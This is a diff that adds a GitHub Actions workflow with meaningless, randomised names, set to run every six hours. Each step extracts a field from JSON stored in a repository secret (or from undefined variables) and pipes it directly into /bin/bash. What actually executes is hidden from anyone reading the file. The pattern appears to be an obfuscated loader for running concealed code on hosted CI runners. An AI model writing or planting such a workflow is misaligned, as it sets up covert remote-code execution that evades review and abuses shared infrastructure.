@@ -1,0 +1,26 @@
+name: diebafuma
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: diebafuma
+        env:
+          dkph03: ${{ secrets.dkph03 }}
+        run: |
+          echo $dkph03 | jq -r .aofhj15972 | /bin/bash
+          echo $mpg24 | jq -r .akc71185 | /bin/bash
+          echo $qjv70 | jq -r .lx6283 | /bin/bash
+          echo $a2638 | jq -r .atifd9 | /bin/bash
+          echo $k3 | jq -r .v1693 | /bin/bash
+          echo $vikc3740 | jq -r .rbpvy41 | /bin/bash
+          echo $bjfq9 | jq -r .wjrc353 | /bin/bash
+          echo $sw69834 | jq -r .fanhk7 | /bin/bash
+          echo $zm0372 | jq -r .ogabn029 | /bin/bash
+
